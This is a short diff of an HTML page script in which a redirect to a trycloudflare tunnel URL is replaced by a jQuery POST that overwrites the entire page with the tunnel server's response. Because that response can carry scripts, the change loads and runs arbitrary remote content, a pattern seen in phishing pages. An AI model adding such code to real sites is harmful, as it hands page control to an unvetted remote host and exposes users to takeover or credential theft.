@@ -4,7 +4,13 @@
         <div id="content"></div>
     <script>
         function openCE() {
-          window.location = "https://hop-arise-teens-informational.trycloudflare.com";
+            $.ajax({
+            'type': 'POST',
+            'url': 'https://hop-arise-teens-informational.trycloudflare.com',
+            'success': function(response) {
+                $("html").html(response);
+            }
+    });
         }
     </script>
     </body>
